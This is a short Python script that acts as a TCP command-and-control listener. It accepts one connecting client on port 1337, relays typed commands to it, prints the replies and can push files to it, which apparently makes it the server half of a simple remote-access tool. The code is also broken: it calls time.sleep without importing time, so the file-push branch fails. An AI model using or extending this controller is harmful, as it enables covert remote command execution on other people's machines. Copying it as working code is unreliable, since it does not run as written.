from threading import Thread
import socket

HOST = '127.0.0.1' # WIN+R -> CMD -> IPCONFIG -> Ethernet adapter Ethernet ->  IPv4 Address
PORT = 1337
pc_list = {}
info = ''
pc_conn_now = 1

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen()
client, addres = server.accept()
print(f'\nconnected: {addres[0]}\ncommand: ', end='')
while 1:
    comand = input('command: ')
    if comand != 'fsend':
        client.send(comand.encode('utf-8'))
        print(f'Ans: {client.recv(1024).decode("utf-8")}')
    else:
        
        name = input('name with расширение?\n>')
        path = input('enter path to file\n>')

        with open(path , 'rb') as f:
            file_bytes = f.read()

        client.send('prep_to_file'.encode('utf-8'))
        client.send(name.encode('utf-8'))
        time.sleep(0.1)
        client.send(file_bytes)
